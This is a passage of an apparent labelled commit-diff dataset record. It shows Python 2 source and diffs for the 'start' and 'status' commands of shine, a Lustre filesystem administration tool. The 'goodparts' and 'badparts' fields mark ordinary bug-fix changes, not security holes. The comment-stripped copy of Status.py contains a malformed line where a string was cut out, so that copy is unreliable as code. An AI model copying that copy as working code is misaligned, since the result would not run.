%(nodes, msg) if hasattr(eh, 'post'): eh.post(fs) return rc ", "sourceWithComments": "# Start.py -- Start file system\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `start' command classes.\n\nThe start command aims to start Lustre filesystem servers or just some\nof the filesystem targets on local or remote servers. It is available\nfor any filesystems previously installed and formatted.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.Commands.Status import Status\nfrom Shine.Commands.Tune import Tune\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.FSEventHandler import FSGlobalEventHandler\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\n\n# Shine Proxy Protocol\nfrom Shine.Lustre.Actions.Proxies.ProxyAction import *\nfrom Shine.Lustre.FileSystem import *\n\n\nclass GlobalStartEventHandler(FSGlobalEventHandler):\n\n    def __init__(self, verbose=1):\n        FSGlobalEventHandler.__init__(self, verbose)\n\n    def handle_pre(self, fs):\n        if self.verbose > 0:\n            print \"Starting %d targets on %s\" % (fs.target_count,\n                    fs.target_servers)\n\n    def handle_post(self, fs):\n        if self.verbose > 0:\n            Status.status_view_fs(fs, show_clients=False)\n\n    def ev_starttarget_start(self, node, target):\n        # start/restart timer if needed (we might be running a new runloop)\n        if self.verbose > 1:\n            print \"%s: Starting %s %s (%s)...\" % (node, \\\n                    target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_done(self, node, target):\n        self.status_changed = True\n        if self.verbose > 1:\n            if target.status_info:\n                print \"%s: Start of %s %s (%s): %s\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev,\n                                target.status_info)\n            else:\n                print \"%s: Start of %s %s (%s) succeeded\" % \\\n                        (node, target.type.upper(), target.get_id(), target.dev)\n        self.update()\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        self.status_changed = True\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to start %s %s (%s): %s\" % \\\n                (node, target.type.upper(), target.get_id(), target.dev,\n                        strerr)\n        if rc:\n            print message\n        self.update()\n\n\nclass LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_starttarget_start(self, node, target):\n        if self.verbose > 1:\n            print \"Starting %s %s (%s)...\" % (target.type.upper(),\n                    target.get_id(), target.dev)\n\n    def ev_starttarget_done(self, node, target):\n        if self.verbose > 1:\n            if target.status_info:\n                print \"Start of %s %s (%s): %s\" % (target.type.upper(),\n                        target.get_id(), target.dev, target.status_info)\n            else:\n                print \"Start of %s %s (%s) succeeded\" % (target.type.upper(),\n                        target.get_id(), target.dev)\n\n    def ev_starttarget_failed(self, node, target, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"Failed to start %s %s (%s): %s\" % (target.type.upper(),\n                target.get_id(), target.dev, strerr)\n        if rc:\n            print message\n\n\nclass Start(FSLiveCommand):\n    \"\"\"\n    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"start\"\n\n    def get_desc(self):\n        return \"Start file system servers.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_OK,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),\n                    GlobalStartEventHandler(vlevel))\n\n            # Open configuration and instantiate a Lustre FS.\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            # Prepare options...\n            mount_options = {}\n            mount_paths = {}\n            for target_type in [ 'mgt', 'mdt', 'ost' ]:\n                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)\n                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            # Will call the handle_pre() method defined by the event handler.\n            if hasattr(eh, 'pre'):\n                eh.pre(fs)\n                \n            status = fs.start(mount_options=mount_options,\n                              mount_paths=mount_paths)\n\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Start successful.\"\n                tuning = Tune.get_tuning(fs_conf)\n                status = fs.tune(tuning)\n                if status == RUNTIME_ERROR:\n                    rc = RC_RUNTIME_ERROR\n                # XXX improve tuning on start error handling\n\n            if rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n            if hasattr(eh, 'post'):\n                eh.post(fs)\n\n            return rc\n"}, "/lib/Shine/Commands/Status.py": {"changes": [{"diff": "\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["        result = -1"], "goodparts": ["        result = 0"]}, {"diff": "\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(sel", "add": 11, "remove": 9, "filename": "/lib/Shine/Commands/Status.py", "badparts": ["            if view == \"fs\":", "                self.status_view_fs(fs)", "            elif view.startswith(\"target\"):", "                self.status_view_targets(fs)", "            elif view.startswith(\"disk\"):", "                self.status_view_disks(fs)", "            else:", "                raise CommandBadParameterError(self.view_support.get_view(),", "                        \"fs, targets, disks\")"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if view == \"fs\":", "                    self.status_view_fs(fs)", "                elif view.startswith(\"target\"):", "                    self.status_view_targets(fs)", "                elif view.startswith(\"disk\"):", "                    self.status_view_disks(fs)", "                else:", "                    raise CommandBadParameterError(self.view_support.get_view(),", "                            \"fs, targets, disks\")"]}], "source": "\n \"\"\" Shine `status' command classes. The status command aims to return the real state of a Lustre filesystem and its components, depending of the requested \"view\". Status views let the Lustre administrator to either stand back and get a global status of the filesystem, or if needed, to enquire about filesystem components detailed states. \"\"\" from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSLiveCommand import FSLiveCommand from Base.CommandRCDefs import * from Base.Support.View import View from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandBadParameterError from Shine.FSUtils import open_lustrefs from Shine.Utilities.AsciiTable import * import Shine.Lustre.EventHandler from Shine.Lustre.Disk import * from Shine.Lustre.FileSystem import * from ClusterShell.NodeSet import NodeSet import os (KILO, MEGA, GIGA, TERA)=(1024, 1048576, 1073741824, 1099511627776) class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_statustarget_start(self, node, target): pass def ev_statustarget_done(self, node, target): pass def ev_statustarget_failed(self, node, target, rc, message): print \"%s: Failed to status %s %s(%s)\" %(node, target.type.upper(), \\ target.get_id(), target.dev) print \">> %s\" % message def ev_statusclient_start(self, node, client): pass def ev_statusclient_done(self, node, client): pass def ev_statusclient_failed(self, node, client, rc, message): print \"%s: Failed to status of FS %s\" %(node, client.fs.fs_name) print \">> %s\" % message class Status(FSLiveCommand): \"\"\" shine status[-f <fsname>][-t <target>][-i <index(es)>][-n <nodes>][-qv] \"\"\" def __init__(self): FSLiveCommand.__init__(self) self.view_support=View(self) def get_name(self): return \"status\" def get_desc(self): return \"Check for file system target status.\" target_status_rc_map={ \\ MOUNTED: RC_ST_ONLINE, RECOVERING: RC_ST_RECOVERING, OFFLINE: RC_ST_OFFLINE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=-1 self.init_execute() vlevel=self.verbose_support.get_verbose_level() target=self.target_support.get_target() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalStatusEventHandler(vlevel)) fs_conf, fs=open_lustrefs(fsname, target, nodes=self.nodes_support.get_nodeset(), indexes=self.indexes_support.get_rangeset(), event_handler=eh) fs.set_debug(self.debug_support.has_debug()) status_flags=STATUS_ANY view=self.view_support.get_view() if view is None: view=\"fs\" else: view=view.lower() if view.startswith(\"disk\") or view.startswith(\"target\"): status_flags &=~STATUS_CLIENTS if view.startswith(\"client\"): status_flags &=~(STATUS_SERVERS|STATUS_HASERVERS) statusdict=fs.status(status_flags) if RUNTIME_ERROR in statusdict: defect_targets=statusdict[RUNTIME_ERROR] for nodes, msg in fs.proxy_errors: print nodes print '-' * 15 print msg print else: defect_targets=[] rc=self.fs_status_to_rc(max(statusdict.keys())) if rc > result: result=rc if view==\"fs\": self.status_view_fs(fs) elif view.startswith(\"target\"): self.status_view_targets(fs) elif view.startswith(\"disk\"): self.status_view_disks(fs) else: raise CommandBadParameterError(self.view_support.get_view(), \"fs, targets, disks\") return result def status_view_targets(self, fs): \"\"\" View: lustre targets \"\"\" print \"FILESYSTEM TARGETS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" else: status=\"UNKNOWN\" ldic.append(target_dict([[\"target\", target.get_id()], [\"type\", target.type.upper()], [\"nodes\", NodeSet.fromlist(target.servers)], [\"device\", target.dev], [\"index\", target.index], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\", AsciiTableLayout.CENTER) layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\", AsciiTableLayout.CENTER) layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) def status_view_fs(cls, fs, show_clients=True): \"\"\" View: lustre FS summary \"\"\" ldic=[] for type,(a_targets, e_targets) in fs.targets_by_type(): nodes=NodeSet() t_offline=[] t_error=[] t_recovering=[] t_online=[] t_runtime=[] t_unknown=[] for target in a_targets: nodes.add(target.servers[0]) if target.state==OFFLINE: t_offline.append(target) elif target.state==TARGET_ERROR: t_error.append(target) elif target.state==RECOVERING: t_recovering.append(target) elif target.state==MOUNTED: t_online.append(target) elif target.state==RUNTIME_ERROR: t_runtime.append(target) else: t_unknown.append(target) status=[] if len(t_offline) > 0: status.append(\"offline(%d)\" % len(t_offline)) if len(t_error) > 0: status.append(\"ERROR(%d)\" % len(t_error)) if len(t_recovering) > 0: status.append(\"recovering(%d) for %s\" %(len(t_recovering), t_recovering[0].status_info)) if len(t_online) > 0: status.append(\"online(%d)\" % len(t_online)) if len(t_runtime) > 0: status.append(\"CHECK FAILURE(%d)\" % len(t_runtime)) if len(t_unknown) > 0: status.append(\"not checked(%d)\" % len(t_unknown)) if len(t_unknown) < len(a_targets): ldic.append(dict([[\"type\", \"%s\" % type.upper()], [\"count\", len(a_targets)],[\"nodes\", nodes], [\"status\", ', '.join(status)]])) if show_clients: (c_ign, c_offline, c_error, c_runtime, c_mounted)=fs.get_client_statecounters() status=[] if c_ign > 0: status.append(\"not checked(%d)\" % c_ign) if c_offline > 0: status.append(\"offline(%d)\" % c_offline) if c_error > 0: status.append(\"ERROR(%d)\" % c_error) if c_runtime > 0: status.append(\"CHECK FAILURE(%d)\" % c_runtime) if c_mounted > 0: status.append(\"mounted(%d)\" % c_mounted) ldic.append(dict([[\"type\", \"CLI\"],[\"count\", len(fs.clients)], [\"nodes\", \"%s\" % fs.get_client_servers()],[\"status\", ', '.join(status)]])) layout=AsciiTableLayout() layout.set_show_header(True) layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER) layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \" layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER) layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) print \"FILESYSTEM COMPONENTS STATUS(%s)\" % fs.fs_name AsciiTable().print_from_list_of_dict(ldic, layout) status_view_fs=classmethod(status_view_fs) def status_view_disks(self, fs): \"\"\" View: lustre disks \"\"\" print \"FILESYSTEM DISKS(%s)\" % fs.fs_name class target_dict(dict): def __lt__(self, other): return self[\"index\"] < other[\"index\"] ldic=[] jdev_col_enabled=False tag_col_enabled=False for type,(all_targets, enabled_targets) in fs.targets_by_type(): for target in enabled_targets: if target.state==OFFLINE: status=\"offline\" elif target.state==RECOVERING: status=\"recovering %s\" % target.status_info elif target.state==MOUNTED: status=\"online\" elif target.state==TARGET_ERROR: status=\"ERROR\" elif target.state==RUNTIME_ERROR: status=\"CHECK FAILURE\" else: status=\"UNKNOWN\" if target.dev_size >=TERA: dev_size=\"%.1fT\" %(target.dev_size/TERA) elif target.dev_size >=GIGA: dev_size=\"%.1fG\" %(target.dev_size/GIGA) elif target.dev_size >=MEGA: dev_size=\"%.1fM\" %(target.dev_size/MEGA) elif target.dev_size >=KILO: dev_size=\"%.1fK\" %(target.dev_size/KILO) else: dev_size=\"%d\" % target.dev_size if target.jdev: jdev_col_enabled=True jdev=target.jdev else: jdev=\"\" if target.tag: tag_col_enabled=True tag=target.tag else: tag=\"\" flags=[] if target.has_need_index_flag(): flags.append(\"need_index\") if target.has_first_time_flag(): flags.append(\"first_time\") if target.has_update_flag(): flags.append(\"update\") if target.has_rewrite_ldd_flag(): flags.append(\"rewrite_ldd\") if target.has_writeconf_flag(): flags.append(\"writeconf\") if target.has_upgrade14_flag(): flags.append(\"upgrade14\") if target.has_param_flag(): flags.append(\"conf_param\") ldic.append(target_dict([\\ [\"nodes\", NodeSet.fromlist(target.servers)], [\"dev\", target.dev], [\"size\", dev_size], [\"jdev\", jdev], [\"type\", target.type.upper()], [\"index\", target.index], [\"tag\", tag], [\"label\", target.label], [\"flags\", ' '.join(flags)], [\"fsname\", target.fs.fs_name], [\"status\", status]])) ldic.sort() layout=AsciiTableLayout() layout.set_show_header(True) i=0 layout.set_column(\"dev\", i, AsciiTableLayout.LEFT, \"device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"nodes\", i, AsciiTableLayout.LEFT, \"node(s)\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"size\", i, AsciiTableLayout.RIGHT, \"dev size\", AsciiTableLayout.CENTER) if jdev_col_enabled: i +=1 layout.set_column(\"jdev\", i, AsciiTableLayout.RIGHT, \"journal device\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"type\", i, AsciiTableLayout.LEFT, \"type\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"index\", i, AsciiTableLayout.RIGHT, \"index\", AsciiTableLayout.CENTER) if tag_col_enabled: i +=1 layout.set_column(\"tag\", i, AsciiTableLayout.LEFT, \"tag\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"label\", i, AsciiTableLayout.LEFT, \"label\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"flags\", i, AsciiTableLayout.LEFT, \"ldd flags\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"fsname\", i, AsciiTableLayout.LEFT, \"fsname\", AsciiTableLayout.CENTER) i +=1 layout.set_column(\"status\", i, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER) AsciiTable().print_from_list_of_dict(ldic, layout) ", "sourceWithComments": "# Status.py -- Check remote filesystem servers and targets status\n# Copyright (C) 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `status' command classes.\n\nThe status command aims to return the real state of a Lustre filesystem\nand its components, depending of the requested \"view\". Status views let\nthe Lustre administrator to either stand back and get a global status\nof the filesystem, or if needed, to enquire about filesystem components\ndetailed states.\n\"\"\"\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSLiveCommand import FSLiveCommand\nfrom Base.CommandRCDefs import *\n# Additional options\nfrom Base.Support.View import View\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\n\n# Error handling\nfrom Exceptions import CommandBadParameterError\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Command output formatting\nfrom Shine.Utilities.AsciiTable import *\n\n# Lustre events and errors\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.Disk import *\nfrom Shine.Lustre.FileSystem import *\n\nfrom ClusterShell.NodeSet import NodeSet\n\nimport os\n\n\n(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)\n\n\nclass GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_statustarget_start(self, node, target):\n        pass\n\n    def ev_statustarget_done(self, node, target):\n        pass\n\n    def ev_statustarget_failed(self, node, target, rc, message):\n        print \"%s: Failed to status %s %s (%s)\" % (node, target.type.upper(), \\\n                target.get_id(), target.dev)\n        print \">> %s\" % message\n\n    def ev_statusclient_start(self, node, client):\n        pass\n\n    def ev_statusclient_done(self, node, client):\n        pass\n\n    def ev_statusclient_failed(self, node, client, rc, message):\n        print \"%s: Failed to status of FS %s\" % (node, client.fs.fs_name)\n        print \">> %s\" % message\n\n\nclass Status(FSLiveCommand):\n    \"\"\"\n    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]\n    \"\"\"\n\n    def __init__(self):\n        FSLiveCommand.__init__(self)\n        self.view_support = View(self)\n\n    def get_name(self):\n        return \"status\"\n\n    def get_desc(self):\n        return \"Check for file system target status.\"\n\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_ST_ONLINE,\n            RECOVERING : RC_ST_RECOVERING,\n            OFFLINE : RC_ST_OFFLINE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n\n        result = -1\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        target = self.target_support.get_target()\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))\n\n            fs_conf, fs = open_lustrefs(fsname, target,\n                    nodes=self.nodes_support.get_nodeset(),\n                    indexes=self.indexes_support.get_rangeset(),\n                    event_handler=eh)\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status_flags = STATUS_ANY\n            view = self.view_support.get_view()\n\n            # default view\n            if view is None:\n                view = \"fs\"\n            else:\n                view = view.lower()\n\n            # disable client checks when not requested\n            if view.startswith(\"disk\") or view.startswith(\"target\"):\n                status_flags &= ~STATUS_CLIENTS\n            # disable servers checks when not requested\n            if view.startswith(\"client\"):\n                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n\n            statusdict = fs.status(status_flags)\n\n            if RUNTIME_ERROR in statusdict:\n                # get targets that couldn't be checked\n                defect_targets = statusdict[RUNTIME_ERROR]\n\n                for nodes, msg in fs.proxy_errors:\n                    print nodes\n                    print '-' * 15\n                    print msg\n                print\n\n            else:\n                defect_targets = []\n\n            rc = self.fs_status_to_rc(max(statusdict.keys()))\n            if rc > result:\n                result = rc\n\n            if view == \"fs\":\n                self.status_view_fs(fs)\n            elif view.startswith(\"target\"):\n                self.status_view_targets(fs)\n            elif view.startswith(\"disk\"):\n                self.status_view_disks(fs)\n            else:\n                raise CommandBadParameterError(self.view_support.get_view(),\n                        \"fs, targets, disks\")\n        return result\n\n    def status_view_targets(self, fs):\n        \"\"\"\n        View: lustre targets\n        \"\"\"\n        print \"FILESYSTEM TARGETS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"]\n\n        ldic = []\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == TARGET_ERROR:\n                    status = \"ERROR\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                else:\n                    status = \"UNKNOWN\"\n\n                ldic.append(target_dict([[\"target\", target.get_id()],\n                    [\"type\", target.type.upper()],\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"device\", target.dev],\n                    [\"index\", target.index],\n                    [\"status\", status]]))\n\n        ldic.sort()\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"target\", 0, AsciiTableLayout.LEFT, \"target id\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"type\", 1, AsciiTableLayout.LEFT, \"type\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"index\", 2, AsciiTableLayout.RIGHT, \"idx\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 3, AsciiTableLayout.LEFT, \"nodes\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"device\", 4, AsciiTableLayout.LEFT, \"device\",\n                AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 5, AsciiTableLayout.LEFT, \"status\",\n                AsciiTableLayout.CENTER)\n\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n\n    def status_view_fs(cls, fs, show_clients=True):\n        \"\"\"\n        View: lustre FS summary\n        \"\"\"\n        ldic = []\n\n        # targets\n        for type, (a_targets, e_targets) in fs.targets_by_type():\n            nodes = NodeSet()\n            t_offline = []\n            t_error = []\n            t_recovering = []\n            t_online = []\n            t_runtime = []\n            t_unknown = []\n            for target in a_targets:\n                nodes.add(target.servers[0])\n\n                # check target status\n                if target.state == OFFLINE:\n                    t_offline.append(target)\n                elif target.state == TARGET_ERROR:\n                    t_error.append(target)\n                elif target.state == RECOVERING:\n                    t_recovering.append(target)\n                elif target.state == MOUNTED:\n                    t_online.append(target)\n                elif target.state == RUNTIME_ERROR:\n                    t_runtime.append(target)\n                else:\n                    t_unknown.append(target)\n\n            status = []\n            if len(t_offline) > 0:\n                status.append(\"offline (%d)\" % len(t_offline))\n            if len(t_error) > 0:\n                status.append(\"ERROR (%d)\" % len(t_error))\n            if len(t_recovering) > 0:\n                status.append(\"recovering (%d) for %s\" % (len(t_recovering),\n                    t_recovering[0].status_info))\n            if len(t_online) > 0:\n                status.append(\"online (%d)\" % len(t_online))\n            if len(t_runtime) > 0:\n                status.append(\"CHECK FAILURE (%d)\" % len(t_runtime))\n            if len(t_unknown) > 0:\n                status.append(\"not checked (%d)\" % len(t_unknown))\n\n            if len(t_unknown) < len(a_targets):\n                ldic.append(dict([[\"type\", \"%s\" % type.upper()],\n                    [\"count\", len(a_targets)], [\"nodes\", nodes],\n                    [\"status\", ', '.join(status)]]))\n\n        # clients\n        if show_clients:\n            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()\n            status = []\n            if c_ign > 0:\n                status.append(\"not checked (%d)\" % c_ign)\n            if c_offline > 0:\n                status.append(\"offline (%d)\" % c_offline)\n            if c_error > 0:\n                status.append(\"ERROR (%d)\" % c_error)\n            if c_runtime > 0:\n                status.append(\"CHECK FAILURE (%d)\" % c_runtime)\n            if c_mounted > 0:\n                status.append(\"mounted (%d)\" % c_mounted)\n\n            ldic.append(dict([[\"type\", \"CLI\"], [\"count\", len(fs.clients)],\n                [\"nodes\", \"%s\" % fs.get_client_servers()], [\"status\", ', '.join(status)]]))\n\n        layout = AsciiTableLayout()\n        layout.set_show_header(True)\n        layout.set_column(\"type\", 0, AsciiTableLayout.CENTER, \"type\", AsciiTableLayout.CENTER)\n        layout.set_column(\"count\", 1, AsciiTableLayout.RIGHT, \"#\", AsciiTableLayout.CENTER)\n        layout.set_column(\"nodes\", 2, AsciiTableLayout.LEFT, \"nodes\", AsciiTableLayout.CENTER)\n        layout.set_column(\"status\", 3, AsciiTableLayout.LEFT, \"status\", AsciiTableLayout.CENTER)\n\n        print \"FILESYSTEM COMPONENTS STATUS (%s)\" % fs.fs_name\n        AsciiTable().print_from_list_of_dict(ldic, layout)\n\n    status_view_fs = classmethod(status_view_fs)\n\n\n    def status_view_disks(self, fs):\n        \"\"\"\n        View: lustre disks\n        \"\"\"\n\n        print \"FILESYSTEM DISKS (%s)\" % fs.fs_name\n\n        # override dict to allow target sorting by index\n        class target_dict(dict):\n            def __lt__(self, other):\n                return self[\"index\"] < other[\"index\"] \n        ldic = []\n        jdev_col_enabled = False\n        tag_col_enabled = False\n        for type, (all_targets, enabled_targets) in fs.targets_by_type():\n            for target in enabled_targets:\n\n                if target.state == OFFLINE:\n                    status = \"offline\"\n                elif target.state == RECOVERING:\n                    status = \"recovering %s\" % target.status_info\n                elif target.state == MOUNTED:\n                    status = \"online\"\n                elif target.state == TARGET_ERROR:\n                    status = \"ERROR\"\n                elif target.state == RUNTIME_ERROR:\n                    status = \"CHECK FAILURE\"\n                else:\n                    status = \"UNKNOWN\"\n\n                if target.dev_size >= TERA:\n                    dev_size = \"%.1fT\" % (target.dev_size/TERA)\n                elif target.dev_size >= GIGA:\n                    dev_size = \"%.1fG\" % (target.dev_size/GIGA)\n                elif target.dev_size >= MEGA:\n                    dev_size = \"%.1fM\" % (target.dev_size/MEGA)\n                elif target.dev_size >= KILO:\n                    dev_size = \"%.1fK\" % (target.dev_size/KILO)\n                else:\n                    dev_size = \"%d\" % target.dev_size\n\n                if target.jdev:\n                    jdev_col_enabled = True\n                    jdev = target.jdev\n                else:\n                    jdev = \"\"\n\n                if target.tag:\n                    tag_col_enabled = True\n                    tag = target.tag\n                else:\n                    tag = \"\"\n\n                flags = []\n                if target.has_need_index_flag():\n                    flags.append(\"need_index\")\n                if target.has_first_time_flag():\n                    flags.append(\"first_time\")\n                if target.has_update_flag():\n                    flags.append(\"update\")\n                if target.has_rewrite_ldd_flag():\n                    flags.append(\"rewrite_ldd\")\n                if target.has_writeconf_flag():\n                    flags.append(\"writeconf\")\n                if target.has_upgrade14_flag():\n                    flags.append(\"upgrade14\")\n                if target.has_param_flag():\n                    flags.append(\"conf_param\")\n\n                ldic.append(target_dict([\\\n                    [\"nodes\", NodeSet.fromlist(target.servers)],\n                    [\"dev\", target.dev],\n                    [\"size\", dev_size],\n                    [\"jdev\", jdev],\n                    [\"type\", target.type.upper()],\n                    [\"index\", target.index],\n                    [\"tag\", tag],\n                    [\"label\", target.label],\n                    [\"flags\", ' '.join(flags)],\n                    [\"fsname\", target.fs.fs_name],\n                    